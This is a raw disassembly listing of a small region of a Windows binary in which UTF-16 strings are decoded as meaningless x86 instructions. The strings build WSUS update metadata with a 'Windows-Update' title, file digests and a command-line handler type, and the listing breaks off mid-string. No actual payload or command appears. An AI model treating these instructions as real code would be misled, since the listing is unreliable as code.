  407339:	00 69 00             	add    %ch,0x0(%ecx)
  40733c:	6f                   	outsl  %ds:(%esi),(%dx)
  40733d:	00 72 00             	add    %dh,0x0(%edx)
  407340:	20 00                	and    %al,(%eax)
  407342:	52                   	push   %edx
  407343:	00 65 00             	add    %ah,0x0(%ebp)
  407346:	62 00                	bound  %eax,(%eax)
  407348:	6f                   	outsl  %ds:(%esi),(%dx)
  407349:	00 6f 00             	add    %ch,0x0(%edi)
  40734c:	74 00                	je     0x40734e
  40734e:	42                   	inc    %edx
  40734f:	00 65 00             	add    %ah,0x0(%ebp)
  407352:	68 00 61 00 76       	push   $0x76006100
  407357:	00 69 00             	add    %ch,0x0(%ecx)
  40735a:	6f                   	outsl  %ds:(%esi),(%dx)
  40735b:	00 72 00             	add    %dh,0x0(%edx)
  40735e:	3d 00 22 00 43       	cmp    $0x43002200,%eax
  407363:	00 61 00             	add    %ah,0x0(%ecx)
  407366:	6e                   	outsb  %ds:(%esi),(%dx)
  407367:	00 52 00             	add    %dl,0x0(%edx)
  40736a:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40736e:	75 00                	jne    0x407370
  407370:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407374:	74 00                	je     0x407376
  407376:	52                   	push   %edx
  407377:	00 65 00             	add    %ah,0x0(%ebp)
  40737a:	62 00                	bound  %eax,(%eax)
  40737c:	6f                   	outsl  %ds:(%esi),(%dx)
  40737d:	00 6f 00             	add    %ch,0x0(%edi)
  407380:	74 00                	je     0x407382
  407382:	22 00                	and    (%eax),%al
  407384:	20 00                	and    %al,(%eax)
  407386:	2f                   	das
  407387:	00 3e                	add    %bh,(%esi)
  407389:	00 00                	add    %al,(%eax)
  40738b:	80 85 09 00 09 00 3c 	addb   $0x3c,0x90009(%ebp)
  407392:	00 75 00             	add    %dh,0x0(%ebp)
  407395:	70 00                	jo     0x407397
  407397:	64 00 3a             	add    %bh,%fs:(%edx)
  40739a:	00 55 00             	add    %dl,0x0(%ebp)
  40739d:	6e                   	outsb  %ds:(%esi),(%dx)
  40739e:	00 69 00             	add    %ch,0x0(%ecx)
  4073a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4073a2:	00 73 00             	add    %dh,0x0(%ebx)
  4073a5:	74 00                	je     0x4073a7
  4073a7:	61                   	popa
  4073a8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4073ac:	00 61 00             	add    %ah,0x0(%ecx)
  4073af:	74 00                	je     0x4073b1
  4073b1:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4073b7:	42                   	inc    %edx
  4073b8:	00 65 00             	add    %ah,0x0(%ebp)
  4073bb:	68 00 61 00 76       	push   $0x76006100
  4073c0:	00 69 00             	add    %ch,0x0(%ecx)
  4073c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c4:	00 72 00             	add    %dh,0x0(%edx)
  4073c7:	20 00                	and    %al,(%eax)
  4073c9:	52                   	push   %edx
  4073ca:	00 65 00             	add    %ah,0x0(%ebp)
  4073cd:	62 00                	bound  %eax,(%eax)
  4073cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4073d0:	00 6f 00             	add    %ch,0x0(%edi)
  4073d3:	74 00                	je     0x4073d5
  4073d5:	42                   	inc    %edx
  4073d6:	00 65 00             	add    %ah,0x0(%ebp)
  4073d9:	68 00 61 00 76       	push   $0x76006100
  4073de:	00 69 00             	add    %ch,0x0(%ecx)
  4073e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e2:	00 72 00             	add    %dh,0x0(%edx)
  4073e5:	3d 00 22 00 43       	cmp    $0x43002200,%eax
  4073ea:	00 61 00             	add    %ah,0x0(%ecx)
  4073ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4073ee:	00 52 00             	add    %dl,0x0(%edx)
  4073f1:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  4073f5:	75 00                	jne    0x4073f7
  4073f7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4073fb:	74 00                	je     0x4073fd
  4073fd:	52                   	push   %edx
  4073fe:	00 65 00             	add    %ah,0x0(%ebp)
  407401:	62 00                	bound  %eax,(%eax)
  407403:	6f                   	outsl  %ds:(%esi),(%dx)
  407404:	00 6f 00             	add    %ch,0x0(%edi)
  407407:	74 00                	je     0x407409
  407409:	22 00                	and    (%eax),%al
  40740b:	20 00                	and    %al,(%eax)
  40740d:	2f                   	das
  40740e:	00 3e                	add    %bh,(%esi)
  407410:	00 00                	add    %al,(%eax)
  407412:	25 09 00 3c 00       	and    $0x3c0009,%eax
  407417:	2f                   	das
  407418:	00 75 00             	add    %dh,0x0(%ebp)
  40741b:	70 00                	jo     0x40741d
  40741d:	64 00 3a             	add    %bh,%fs:(%edx)
  407420:	00 50 00             	add    %dl,0x0(%eax)
  407423:	72 00                	jb     0x407425
  407425:	6f                   	outsl  %ds:(%esi),(%dx)
  407426:	00 70 00             	add    %dh,0x0(%eax)
  407429:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40742d:	74 00                	je     0x40742f
  40742f:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407435:	3e 00 00             	add    %al,%ds:(%eax)
  407438:	49                   	dec    %ecx
  407439:	09 00                	or     %eax,(%eax)
  40743b:	3c 00                	cmp    $0x0,%al
  40743d:	75 00                	jne    0x40743f
  40743f:	70 00                	jo     0x407441
  407441:	64 00 3a             	add    %bh,%fs:(%edx)
  407444:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  407448:	00 63 00             	add    %ah,0x0(%ebx)
  40744b:	61                   	popa
  40744c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  407450:	00 7a 00             	add    %bh,0x0(%edx)
  407453:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  407458:	00 72 00             	add    %dh,0x0(%edx)
  40745b:	6f                   	outsl  %ds:(%esi),(%dx)
  40745c:	00 70 00             	add    %dh,0x0(%eax)
  40745f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407463:	74 00                	je     0x407465
  407465:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40746b:	43                   	inc    %ebx
  40746c:	00 6f 00             	add    %ch,0x0(%edi)
  40746f:	6c                   	insb   (%dx),%es:(%edi)
  407470:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  407474:	00 63 00             	add    %ah,0x0(%ebx)
  407477:	74 00                	je     0x407479
  407479:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40747f:	3e 00 00             	add    %al,%ds:(%eax)
  407482:	37                   	aaa
  407483:	09 00                	or     %eax,(%eax)
  407485:	09 00                	or     %eax,(%eax)
  407487:	3c 00                	cmp    $0x0,%al
  407489:	75 00                	jne    0x40748b
  40748b:	70 00                	jo     0x40748d
  40748d:	64 00 3a             	add    %bh,%fs:(%edx)
  407490:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  407494:	00 63 00             	add    %ah,0x0(%ebx)
  407497:	61                   	popa
  407498:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40749c:	00 7a 00             	add    %bh,0x0(%edx)
  40749f:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  4074a4:	00 72 00             	add    %dh,0x0(%edx)
  4074a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4074a8:	00 70 00             	add    %dh,0x0(%eax)
  4074ab:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074af:	74 00                	je     0x4074b1
  4074b1:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4074b7:	3e 00 00             	add    %al,%ds:(%eax)
  4074ba:	45                   	inc    %ebp
  4074bb:	09 00                	or     %eax,(%eax)
  4074bd:	09 00                	or     %eax,(%eax)
  4074bf:	09 00                	or     %eax,(%eax)
  4074c1:	3c 00                	cmp    $0x0,%al
  4074c3:	75 00                	jne    0x4074c5
  4074c5:	70 00                	jo     0x4074c7
  4074c7:	64 00 3a             	add    %bh,%fs:(%edx)
  4074ca:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  4074ce:	00 6e 00             	add    %ch,0x0(%esi)
  4074d1:	67 00 75 00          	add    %dh,0x0(%di)
  4074d5:	61                   	popa
  4074d6:	00 67 00             	add    %ah,0x0(%edi)
  4074d9:	65 00 3e             	add    %bh,%gs:(%esi)
  4074dc:	00 65 00             	add    %ah,0x0(%ebp)
  4074df:	6e                   	outsb  %ds:(%esi),(%dx)
  4074e0:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4074e3:	2f                   	das
  4074e4:	00 75 00             	add    %dh,0x0(%ebp)
  4074e7:	70 00                	jo     0x4074e9
  4074e9:	64 00 3a             	add    %bh,%fs:(%edx)
  4074ec:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  4074f0:	00 6e 00             	add    %ch,0x0(%esi)
  4074f3:	67 00 75 00          	add    %dh,0x0(%di)
  4074f7:	61                   	popa
  4074f8:	00 67 00             	add    %ah,0x0(%edi)
  4074fb:	65 00 3e             	add    %bh,%gs:(%esi)
  4074fe:	00 00                	add    %al,(%eax)
  407500:	51                   	push   %ecx
  407501:	09 00                	or     %eax,(%eax)
  407503:	09 00                	or     %eax,(%eax)
  407505:	09 00                	or     %eax,(%eax)
  407507:	3c 00                	cmp    $0x0,%al
  407509:	75 00                	jne    0x40750b
  40750b:	70 00                	jo     0x40750d
  40750d:	64 00 3a             	add    %bh,%fs:(%edx)
  407510:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  407514:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  407518:	00 65 00             	add    %ah,0x0(%ebp)
  40751b:	3e 00 57 00          	add    %dl,%ds:0x0(%edi)
  40751f:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  407525:	6f                   	outsl  %ds:(%esi),(%dx)
  407526:	00 77 00             	add    %dh,0x0(%edi)
  407529:	73 00                	jae    0x40752b
  40752b:	2d 00 55 00 70       	sub    $0x70005500,%eax
  407530:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  407534:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407538:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40753b:	2f                   	das
  40753c:	00 75 00             	add    %dh,0x0(%ebp)
  40753f:	70 00                	jo     0x407541
  407541:	64 00 3a             	add    %bh,%fs:(%edx)
  407544:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  407548:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40754c:	00 65 00             	add    %ah,0x0(%ebp)
  40754f:	3e 00 01             	add    %al,%ds:(%ecx)
  407552:	39 09                	cmp    %ecx,(%ecx)
  407554:	00 09                	add    %cl,(%ecx)
  407556:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407559:	2f                   	das
  40755a:	00 75 00             	add    %dh,0x0(%ebp)
  40755d:	70 00                	jo     0x40755f
  40755f:	64 00 3a             	add    %bh,%fs:(%edx)
  407562:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  407566:	00 63 00             	add    %ah,0x0(%ebx)
  407569:	61                   	popa
  40756a:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40756e:	00 7a 00             	add    %bh,0x0(%edx)
  407571:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  407576:	00 72 00             	add    %dh,0x0(%edx)
  407579:	6f                   	outsl  %ds:(%esi),(%dx)
  40757a:	00 70 00             	add    %dh,0x0(%eax)
  40757d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407581:	74 00                	je     0x407583
  407583:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407589:	3e 00 00             	add    %al,%ds:(%eax)
  40758c:	4b                   	dec    %ebx
  40758d:	09 00                	or     %eax,(%eax)
  40758f:	3c 00                	cmp    $0x0,%al
  407591:	2f                   	das
  407592:	00 75 00             	add    %dh,0x0(%ebp)
  407595:	70 00                	jo     0x407597
  407597:	64 00 3a             	add    %bh,%fs:(%edx)
  40759a:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40759e:	00 63 00             	add    %ah,0x0(%ebx)
  4075a1:	61                   	popa
  4075a2:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4075a6:	00 7a 00             	add    %bh,0x0(%edx)
  4075a9:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  4075ae:	00 72 00             	add    %dh,0x0(%edx)
  4075b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075b2:	00 70 00             	add    %dh,0x0(%eax)
  4075b5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4075b9:	74 00                	je     0x4075bb
  4075bb:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4075c1:	43                   	inc    %ebx
  4075c2:	00 6f 00             	add    %ch,0x0(%edi)
  4075c5:	6c                   	insb   (%dx),%es:(%edi)
  4075c6:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4075ca:	00 63 00             	add    %ah,0x0(%ebx)
  4075cd:	74 00                	je     0x4075cf
  4075cf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4075d5:	3e 00 00             	add    %al,%ds:(%eax)
  4075d8:	33 09                	xor    (%ecx),%ecx
  4075da:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4075dd:	75 00                	jne    0x4075df
  4075df:	70 00                	jo     0x4075e1
  4075e1:	64 00 3a             	add    %bh,%fs:(%edx)
  4075e4:	00 41 00             	add    %al,0x0(%ecx)
  4075e7:	70 00                	jo     0x4075e9
  4075e9:	70 00                	jo     0x4075eb
  4075eb:	6c                   	insb   (%dx),%es:(%edi)
  4075ec:	00 69 00             	add    %ch,0x0(%ecx)
  4075ef:	63 00                	arpl   %eax,(%eax)
  4075f1:	61                   	popa
  4075f2:	00 62 00             	add    %ah,0x0(%edx)
  4075f5:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  4075fb:	74 00                	je     0x4075fd
  4075fd:	79 00                	jns    0x4075ff
  4075ff:	52                   	push   %edx
  407600:	00 75 00             	add    %dh,0x0(%ebp)
  407603:	6c                   	insb   (%dx),%es:(%edi)
  407604:	00 65 00             	add    %ah,0x0(%ebp)
  407607:	73 00                	jae    0x407609
  407609:	3e 00 00             	add    %al,%ds:(%eax)
  40760c:	61                   	popa
  40760d:	09 00                	or     %eax,(%eax)
  40760f:	09 00                	or     %eax,(%eax)
  407611:	3c 00                	cmp    $0x0,%al
  407613:	75 00                	jne    0x407615
  407615:	70 00                	jo     0x407617
  407617:	64 00 3a             	add    %bh,%fs:(%edx)
  40761a:	00 49 00             	add    %cl,0x0(%ecx)
  40761d:	73 00                	jae    0x40761f
  40761f:	49                   	dec    %ecx
  407620:	00 6e 00             	add    %ch,0x0(%esi)
  407623:	73 00                	jae    0x407625
  407625:	74 00                	je     0x407627
  407627:	61                   	popa
  407628:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40762c:	00 65 00             	add    %ah,0x0(%ebp)
  40762f:	64 00 3e             	add    %bh,%fs:(%esi)
  407632:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407635:	62 00                	bound  %eax,(%eax)
  407637:	3a 00                	cmp    (%eax),%al
  407639:	46                   	inc    %esi
  40763a:	00 61 00             	add    %ah,0x0(%ecx)
  40763d:	6c                   	insb   (%dx),%es:(%edi)
  40763e:	00 73 00             	add    %dh,0x0(%ebx)
  407641:	65 00 20             	add    %ah,%gs:(%eax)
  407644:	00 2f                	add    %ch,(%edi)
  407646:	00 3e                	add    %bh,(%esi)
  407648:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40764b:	2f                   	das
  40764c:	00 75 00             	add    %dh,0x0(%ebp)
  40764f:	70 00                	jo     0x407651
  407651:	64 00 3a             	add    %bh,%fs:(%edx)
  407654:	00 49 00             	add    %cl,0x0(%ecx)
  407657:	73 00                	jae    0x407659
  407659:	49                   	dec    %ecx
  40765a:	00 6e 00             	add    %ch,0x0(%esi)
  40765d:	73 00                	jae    0x40765f
  40765f:	74 00                	je     0x407661
  407661:	61                   	popa
  407662:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407666:	00 65 00             	add    %ah,0x0(%ebp)
  407669:	64 00 3e             	add    %bh,%fs:(%esi)
  40766c:	00 00                	add    %al,(%eax)
  40766e:	67 09 00             	or     %eax,(%bx,%si)
  407671:	09 00                	or     %eax,(%eax)
  407673:	3c 00                	cmp    $0x0,%al
  407675:	75 00                	jne    0x407677
  407677:	70 00                	jo     0x407679
  407679:	64 00 3a             	add    %bh,%fs:(%edx)
  40767c:	00 49 00             	add    %cl,0x0(%ecx)
  40767f:	73 00                	jae    0x407681
  407681:	49                   	dec    %ecx
  407682:	00 6e 00             	add    %ch,0x0(%esi)
  407685:	73 00                	jae    0x407687
  407687:	74 00                	je     0x407689
  407689:	61                   	popa
  40768a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40768e:	00 61 00             	add    %ah,0x0(%ecx)
  407691:	62 00                	bound  %eax,(%eax)
  407693:	6c                   	insb   (%dx),%es:(%edi)
  407694:	00 65 00             	add    %ah,0x0(%ebp)
  407697:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40769b:	62 00                	bound  %eax,(%eax)
  40769d:	3a 00                	cmp    (%eax),%al
  40769f:	54                   	push   %esp
  4076a0:	00 72 00             	add    %dh,0x0(%edx)
  4076a3:	75 00                	jne    0x4076a5
  4076a5:	65 00 20             	add    %ah,%gs:(%eax)
  4076a8:	00 2f                	add    %ch,(%edi)
  4076aa:	00 3e                	add    %bh,(%esi)
  4076ac:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4076af:	2f                   	das
  4076b0:	00 75 00             	add    %dh,0x0(%ebp)
  4076b3:	70 00                	jo     0x4076b5
  4076b5:	64 00 3a             	add    %bh,%fs:(%edx)
  4076b8:	00 49 00             	add    %cl,0x0(%ecx)
  4076bb:	73 00                	jae    0x4076bd
  4076bd:	49                   	dec    %ecx
  4076be:	00 6e 00             	add    %ch,0x0(%esi)
  4076c1:	73 00                	jae    0x4076c3
  4076c3:	74 00                	je     0x4076c5
  4076c5:	61                   	popa
  4076c6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4076ca:	00 61 00             	add    %ah,0x0(%ecx)
  4076cd:	62 00                	bound  %eax,(%eax)
  4076cf:	6c                   	insb   (%dx),%es:(%edi)
  4076d0:	00 65 00             	add    %ah,0x0(%ebp)
  4076d3:	3e 00 00             	add    %al,%ds:(%eax)
  4076d6:	35 09 00 3c 00       	xor    $0x3c0009,%eax
  4076db:	2f                   	das
  4076dc:	00 75 00             	add    %dh,0x0(%ebp)
  4076df:	70 00                	jo     0x4076e1
  4076e1:	64 00 3a             	add    %bh,%fs:(%edx)
  4076e4:	00 41 00             	add    %al,0x0(%ecx)
  4076e7:	70 00                	jo     0x4076e9
  4076e9:	70 00                	jo     0x4076eb
  4076eb:	6c                   	insb   (%dx),%es:(%edi)
  4076ec:	00 69 00             	add    %ch,0x0(%ecx)
  4076ef:	63 00                	arpl   %eax,(%eax)
  4076f1:	61                   	popa
  4076f2:	00 62 00             	add    %ah,0x0(%edx)
  4076f5:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  4076fb:	74 00                	je     0x4076fd
  4076fd:	79 00                	jns    0x4076ff
  4076ff:	52                   	push   %edx
  407700:	00 75 00             	add    %dh,0x0(%ebp)
  407703:	6c                   	insb   (%dx),%es:(%edi)
  407704:	00 65 00             	add    %ah,0x0(%ebp)
  407707:	73 00                	jae    0x407709
  407709:	3e 00 00             	add    %al,%ds:(%eax)
  40770c:	19 09                	sbb    %ecx,(%ecx)
  40770e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407711:	75 00                	jne    0x407713
  407713:	70 00                	jo     0x407715
  407715:	64 00 3a             	add    %bh,%fs:(%edx)
  407718:	00 46 00             	add    %al,0x0(%esi)
  40771b:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  407721:	73 00                	jae    0x407723
  407723:	3e 00 00             	add    %al,%ds:(%eax)
  407726:	29 09                	sub    %ecx,(%ecx)
  407728:	00 09                	add    %cl,(%ecx)
  40772a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40772d:	75 00                	jne    0x40772f
  40772f:	70 00                	jo     0x407731
  407731:	64 00 3a             	add    %bh,%fs:(%edx)
  407734:	00 46 00             	add    %al,0x0(%esi)
  407737:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40773d:	20 00                	and    %al,(%eax)
  40773f:	44                   	inc    %esp
  407740:	00 69 00             	add    %ch,0x0(%ecx)
  407743:	67 00 65 00          	add    %ah,0x0(%di)
  407747:	73 00                	jae    0x407749
  407749:	74 00                	je     0x40774b
  40774b:	3d 00 22 00 00       	cmp    $0x2200,%eax
  407750:	47                   	inc    %edi
  407751:	22 00                	and    (%eax),%al
  407753:	20 00                	and    %al,(%eax)
  407755:	44                   	inc    %esp
  407756:	00 69 00             	add    %ch,0x0(%ecx)
  407759:	67 00 65 00          	add    %ah,0x0(%di)
  40775d:	73 00                	jae    0x40775f
  40775f:	74 00                	je     0x407761
  407761:	41                   	inc    %ecx
  407762:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  407766:	00 6f 00             	add    %ch,0x0(%edi)
  407769:	72 00                	jb     0x40776b
  40776b:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  407771:	6d                   	insl   (%dx),%es:(%edi)
  407772:	00 3d 00 22 00 53    	add    %bh,0x53002200
  407778:	00 48 00             	add    %cl,0x0(%eax)
  40777b:	41                   	inc    %ecx
  40777c:	00 31                	add    %dh,(%ecx)
  40777e:	00 22                	add    %ah,(%edx)
  407780:	00 20                	add    %ah,(%eax)
  407782:	00 46 00             	add    %al,0x0(%esi)
  407785:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40778b:	4e                   	dec    %esi
  40778c:	00 61 00             	add    %ah,0x0(%ecx)
  40778f:	6d                   	insl   (%dx),%es:(%edi)
  407790:	00 65 00             	add    %ah,0x0(%ebp)
  407793:	3d 00 22 00 00       	cmp    $0x2200,%eax
  407798:	11 22                	adc    %esp,(%edx)
  40779a:	00 20                	add    %ah,(%eax)
  40779c:	00 53 00             	add    %dl,0x0(%ebx)
  40779f:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  4077a5:	3d 00 22 00 00       	cmp    $0x2200,%eax
  4077aa:	19 22                	sbb    %esp,(%edx)
  4077ac:	00 20                	add    %ah,(%eax)
  4077ae:	00 4d 00             	add    %cl,0x0(%ebp)
  4077b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b2:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4077b6:	00 66 00             	add    %ah,0x0(%esi)
  4077b9:	69 00 65 00 64 00    	imul   $0x640065,(%eax),%eax
  4077bf:	3d 00 22 00 00       	cmp    $0x2200,%eax
  4077c4:	1f                   	pop    %ds
  4077c5:	54                   	push   %esp
  4077c6:	00 31                	add    %dh,(%ecx)
  4077c8:	00 35 00 3a 00 32    	add    %dh,0x32003a00
  4077ce:	00 36                	add    %dh,(%esi)
  4077d0:	00 3a                	add    %bh,(%edx)
  4077d2:	00 32                	add    %dh,(%edx)
  4077d4:	00 30                	add    %dh,(%eax)
  4077d6:	00 2e                	add    %ch,(%esi)
  4077d8:	00 37                	add    %dh,(%edi)
  4077da:	00 32                	add    %dh,(%edx)
  4077dc:	00 33                	add    %dh,(%ebx)
  4077de:	00 22                	add    %ah,(%edx)
  4077e0:	00 3e                	add    %bh,(%esi)
  4077e2:	00 00                	add    %al,(%eax)
  4077e4:	59                   	pop    %ecx
  4077e5:	09 00                	or     %eax,(%eax)
  4077e7:	09 00                	or     %eax,(%eax)
  4077e9:	09 00                	or     %eax,(%eax)
  4077eb:	3c 00                	cmp    $0x0,%al
  4077ed:	75 00                	jne    0x4077ef
  4077ef:	70 00                	jo     0x4077f1
  4077f1:	64 00 3a             	add    %bh,%fs:(%edx)
  4077f4:	00 41 00             	add    %al,0x0(%ecx)
  4077f7:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  4077fc:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407800:	00 6f 00             	add    %ch,0x0(%edi)
  407803:	6e                   	outsb  %ds:(%esi),(%dx)
  407804:	00 61 00             	add    %ah,0x0(%ecx)
  407807:	6c                   	insb   (%dx),%es:(%edi)
  407808:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40780c:	00 67 00             	add    %ah,0x0(%edi)
  40780f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407813:	74 00                	je     0x407815
  407815:	20 00                	and    %al,(%eax)
  407817:	41                   	inc    %ecx
  407818:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  40781c:	00 6f 00             	add    %ch,0x0(%edi)
  40781f:	72 00                	jb     0x407821
  407821:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  407827:	6d                   	insl   (%dx),%es:(%edi)
  407828:	00 3d 00 22 00 53    	add    %bh,0x53002200
  40782e:	00 48 00             	add    %cl,0x0(%eax)
  407831:	41                   	inc    %ecx
  407832:	00 32                	add    %dh,(%edx)
  407834:	00 35 00 36 00 22    	add    %dh,0x22003600
  40783a:	00 3e                	add    %bh,(%esi)
  40783c:	00 00                	add    %al,(%eax)
  40783e:	2f                   	das
  40783f:	3c 00                	cmp    $0x0,%al
  407841:	2f                   	das
  407842:	00 75 00             	add    %dh,0x0(%ebp)
  407845:	70 00                	jo     0x407847
  407847:	64 00 3a             	add    %bh,%fs:(%edx)
  40784a:	00 41 00             	add    %al,0x0(%ecx)
  40784d:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  407852:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407856:	00 6f 00             	add    %ch,0x0(%edi)
  407859:	6e                   	outsb  %ds:(%esi),(%dx)
  40785a:	00 61 00             	add    %ah,0x0(%ecx)
  40785d:	6c                   	insb   (%dx),%es:(%edi)
  40785e:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  407862:	00 67 00             	add    %ah,0x0(%edi)
  407865:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407869:	74 00                	je     0x40786b
  40786b:	3e 00 00             	add    %al,%ds:(%eax)
  40786e:	1b 09                	sbb    (%ecx),%ecx
  407870:	00 09                	add    %cl,(%ecx)
  407872:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407875:	2f                   	das
  407876:	00 75 00             	add    %dh,0x0(%ebp)
  407879:	70 00                	jo     0x40787b
  40787b:	64 00 3a             	add    %bh,%fs:(%edx)
  40787e:	00 46 00             	add    %al,0x0(%esi)
  407881:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  407887:	3e 00 00             	add    %al,%ds:(%eax)
  40788a:	1b 09                	sbb    (%ecx),%ecx
  40788c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40788f:	2f                   	das
  407890:	00 75 00             	add    %dh,0x0(%ebp)
  407893:	70 00                	jo     0x407895
  407895:	64 00 3a             	add    %bh,%fs:(%edx)
  407898:	00 46 00             	add    %al,0x0(%esi)
  40789b:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4078a1:	73 00                	jae    0x4078a3
  4078a3:	3e 00 00             	add    %al,%ds:(%eax)
  4078a6:	81 73 09 00 3c 00 75 	xorl   $0x75003c00,0x9(%ebx)
  4078ad:	00 70 00             	add    %dh,0x0(%eax)
  4078b0:	64 00 3a             	add    %bh,%fs:(%edx)
  4078b3:	00 48 00             	add    %cl,0x0(%eax)
  4078b6:	61                   	popa
  4078b7:	00 6e 00             	add    %ch,0x0(%esi)
  4078ba:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  4078bf:	00 72 00             	add    %dh,0x0(%edx)
  4078c2:	53                   	push   %ebx
  4078c3:	00 70 00             	add    %dh,0x0(%eax)
  4078c6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4078ca:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  4078d0:	63 00                	arpl   %eax,(%eax)
  4078d2:	44                   	inc    %esp
  4078d3:	00 61 00             	add    %ah,0x0(%ecx)
  4078d6:	74 00                	je     0x4078d8
  4078d8:	61                   	popa
  4078d9:	00 20                	add    %ah,(%eax)
  4078db:	00 78 00             	add    %bh,0x0(%eax)
  4078de:	73 00                	jae    0x4078e0
  4078e0:	69 00 3a 00 74 00    	imul   $0x74003a,(%eax),%eax
  4078e6:	79 00                	jns    0x4078e8
  4078e8:	70 00                	jo     0x4078ea
  4078ea:	65 00 3d 00 22 00 63 	add    %bh,%gs:0x63002200
  4078f1:	00 6d 00             	add    %ch,0x0(%ebp)
  4078f4:	64 00 3a             	add    %bh,%fs:(%edx)
  4078f7:	00 20                	add    %ah,(%eax)
  4078f9:	00 43 00             	add    %al,0x0(%ebx)
  4078fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fd:	00 6d 00             	add    %ch,0x0(%ebp)
  407900:	6d                   	insl   (%dx),%es:(%edi)
  407901:	00 61 00             	add    %ah,0x0(%ecx)
  407904:	6e                   	outsb  %ds:(%esi),(%dx)
  407905:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  407909:	00 69 00             	add    %ch,0x0(%ecx)
  40790c:	6e                   	outsb  %ds:(%esi),(%dx)
